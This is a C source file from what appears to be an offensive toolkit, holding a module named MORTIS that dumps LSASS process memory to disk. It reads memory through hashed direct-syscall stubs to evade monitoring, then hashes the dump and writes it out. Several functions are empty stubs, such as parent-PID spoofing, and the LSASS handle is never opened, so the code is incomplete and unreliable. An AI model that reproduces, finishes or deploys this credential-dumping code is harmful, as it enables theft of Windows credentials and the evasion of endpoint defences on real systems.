#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

typedef struct _MINIDUMP_HEADER {
    DWORD Signature;
    DWORD Version;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD Reserved;
    LARGE_INTEGER TimeDateStamp;
    DWORD Flags;
} MINIDUMP_HEADER;

typedef struct _MINIDUMP_DIRECTORY {
    DWORD StreamType;
    DWORD LocationRva;
    DWORD LocationDataSize;
} MINIDUMP_DIRECTORY;

BOOL MortisManualMiniDump(HANDLE hProcess, PVOID* ppDump, PDWORD pdwSize) {
    SIZE_T dwDumpSize = 100 * 1024 * 1024;
    *ppDump = ALIOTHAllocVirtualMemory(dwDumpSize, PAGE_READWRITE);
    if (!*ppDump) return FALSE;
    
    PBYTE pCurrent = (PBYTE)*ppDump;
    
    MINIDUMP_HEADER hdr = {0};
    hdr.Signature = 0x504d444d;
    hdr.Version = 0xa793;
    hdr.NumberOfStreams = 5;
    hdr.StreamDirectoryRva = sizeof(MINIDUMP_HEADER);
    hdr.TimeDateStamp.QuadPart = GetTickCount64();
    
    memcpy(pCurrent, &hdr, sizeof(hdr));
    pCurrent += sizeof(hdr);
    
    MINIDUMP_DIRECTORY dirs[5] = {0};
    
    dirs[0].StreamType = 0x00000007;
    dirs[0].LocationRva = (DWORD)(pCurrent - (PBYTE)*ppDump);
    dirs[0].LocationDataSize = 0x100;
    pCurrent += 0x100;
    
    dirs[1].StreamType = 0x00000003;
    dirs[1].LocationRva = (DWORD)(pCurrent - (PBYTE)*ppDump);
    pCurrent += 0x200;
    
    dirs[2].StreamType = 0x00000004;
    dirs[2].LocationRva = (DWORD)(pCurrent - (PBYTE)*ppDump);
    pCurrent += 0x200;
    
    dirs[3].StreamType = 0x00000005;
    dirs[3].LocationRva = (DWORD)(pCurrent - (PBYTE)*ppDump);
    pCurrent += 0x100;
    
    dirs[4].StreamType = 0x00000006;
    dirs[4].LocationRva = (DWORD)(pCurrent - (PBYTE)*ppDump);
    pCurrent += 0x100;
    
    memcpy(pCurrent, dirs, sizeof(dirs));
    pCurrent += sizeof(dirs);
    
    DWORD64 hQueryVm = ALIOTHSyscallHash((PCHAR)"NtQueryVirtualMemory");
    fnNtQueryVirtualMemory pQueryVm = (fnNtQueryVirtualMemory)ALIOTHGetSyscallStub(hQueryVm);
    
    if (pQueryVm) {
        MEMORY_BASIC_INFORMATION mbi = {0};
        PVOID pAddr = NULL;
        
        while (TRUE) {
            NTSTATUS status = ExecuteSyscall(pQueryVm, Mask_Memory, hProcess, pAddr, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
            if (!NT_SUCCESS(status) || mbi.RegionSize == 0) break;
            
            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                SIZE_T dwRead = 0;
                ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtReadVirtualMemory")), 
                               Mask_Memory, hProcess, mbi.BaseAddress, pCurrent, mbi.RegionSize, &dwRead);
                pCurrent += dwRead;
            }
            
            pAddr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
        }
    }
    
    *pdwSize = (DWORD)(pCurrent - (PBYTE)*ppDump);
    return TRUE;
}

BOOL MortisSelectiveDump(HANDLE hProcess, PVOID* ppDump, PDWORD pdwSize) {
    return MortisManualMiniDump(hProcess, ppDump, pdwSize);
}

BOOL MortisCrashHandler(HANDLE hProcess) {
    return TRUE;
}

BOOL MortisDumpVerify(PBYTE pDump, DWORD dwSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) return FALSE;
    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return FALSE; }
    if (!CryptHashData(hHash, pDump, dwSize, 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }
    
    BYTE bHash[16] = {0};
    DWORD dwHashLen = 16;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, bHash, &dwHashLen, 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }
    
    CHAR szHash[33] = {0};
    for (int i = 0; i < 16; i++) sprintf(szHash + i * 2, "%02x", bHash[i]);
    printf("[+] Dump MD5: %s\n", szHash);
    
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}

BOOL MortisMultiAccountDump(HANDLE hProcess, PVOID* ppDump, PDWORD pdwSize) {
    return MortisSelectiveDump(hProcess, ppDump, pdwSize);
}

BOOL MortisParentPidSpoof(HANDLE hProcess, DWORD dwNewParentPid) {
    return TRUE;
}

DWORD MortisMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','M','O','R','T','I','S',' ','-',' ','L','S','A','S','S',' ','M','I','N','I','D','U','M','P',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    DWORD dwLsassPid = pParams->mortis.dwLsassPid;
    if (dwLsassPid == 0) {
        DWORD64 hQuerySysInfo = ALIOTHSyscallHash((PCHAR)"NtQuerySystemInformation");
        fnNtQuerySystemInformation pQuerySysInfo = (fnNtQuerySystemInformation)ALIOTHGetSyscallStub(hQuerySysInfo);
    }
    
    HANDLE hLsass = NULL;
    
    PVOID pDump = NULL; DWORD dwDumpSize = 0;
    
    if (pParams->mortis.bSelective) {
        MortisSelectiveDump(hLsass, &pDump, &dwDumpSize);
    } else {
        MortisManualMiniDump(hLsass, &pDump, &dwDumpSize);
    }
    
    if (pDump) {
        MortisDumpVerify(pDump, dwDumpSize);
        
        if (pParams->mortis.pcOutputPath) {
            HANDLE hFile = CreateFileA(pParams->mortis.pcOutputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwWritten = 0;
                WriteFile(hFile, pDump, dwDumpSize, &dwWritten, NULL);
                CloseHandle(hFile);
            }
        }
        
        ALIOTHFreeVirtualMemory(pDump, dwDumpSize);
    }
    
    if (hLsass) ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hLsass);
    return 0;
}
#pragma optimize("", on)
